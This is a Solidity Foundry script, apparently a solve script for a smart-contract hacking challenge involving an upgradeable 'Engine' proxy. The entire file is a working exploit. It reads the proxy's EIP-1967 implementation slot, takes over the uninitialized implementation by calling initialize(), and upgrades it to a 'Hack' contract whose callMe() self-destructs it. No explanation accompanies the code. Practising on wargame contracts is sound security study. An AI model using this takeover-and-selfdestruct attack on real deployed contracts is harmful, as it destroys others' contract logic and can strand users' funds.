// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

interface IEngine {
  function initialize() external;

  function upgrader() external view returns (address);

  function upgradeToAndCall(address newImplementation, bytes memory data) external payable;

  function horsePower() external view returns (uint256);
}

contract Hack {
  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function callMe() public {
    selfdestruct(payable(owner));
  }
}

contract Solve is Script, Test {
  address target = address(0xaCFbE7879eEd54C81e11B96531271A3a9a01f4ee);

  function run() public {
    vm.startBroadcast();

    bytes32 implementationHash = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
    emit log_named_bytes("Implementation hash", abi.encodePacked(implementationHash));

    bytes32 implementation = vm.load(target, implementationHash);
    address implementationAddress = address(uint160(uint256(implementation)));
    console.log("Implementation address: %s", implementationAddress);

    console.log("Upgrader address: %s", IEngine(implementationAddress).upgrader());
    IEngine(implementationAddress).initialize();
    console.log("Upgrader new address: %s", IEngine(implementationAddress).upgrader());

    Hack h = new Hack();
    IEngine(implementationAddress).upgradeToAndCall(address(h), abi.encodeWithSignature("callMe()"));

    console.log("Upgrader address: %s", IEngine(implementationAddress).upgrader());
    console.log("Horse power: %s", IEngine(implementationAddress).horsePower());

    vm.stopBroadcast();
  }
}
